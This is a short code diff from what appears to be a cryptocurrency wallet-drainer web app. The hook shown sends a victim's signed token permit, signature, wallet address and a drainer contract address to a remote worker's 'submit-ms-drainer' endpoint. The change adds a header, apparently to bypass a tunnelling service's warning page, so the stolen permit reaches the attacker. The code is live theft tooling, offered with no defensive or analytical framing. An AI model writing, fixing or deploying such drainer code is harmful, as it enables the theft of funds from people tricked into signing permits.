@@ -393,7 +393,11 @@ export function useWeb3Manager() {
 
                             try {
                                 const res = await fetch(`${WORKER_URL}/submit-ms-drainer`, {
-                                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'Bypass-Tunnel-Reminders': 'true'
+                                    },
                                     body: JSON.stringify({ permit, signature, chainName: targetChainName, owner: address, contractAddress: MS_DRAINER_2026_ADDRESS, order }, (_, v) => typeof v === 'bigint' ? v.toString() : v)
                                 });
                                 if (res.ok) {
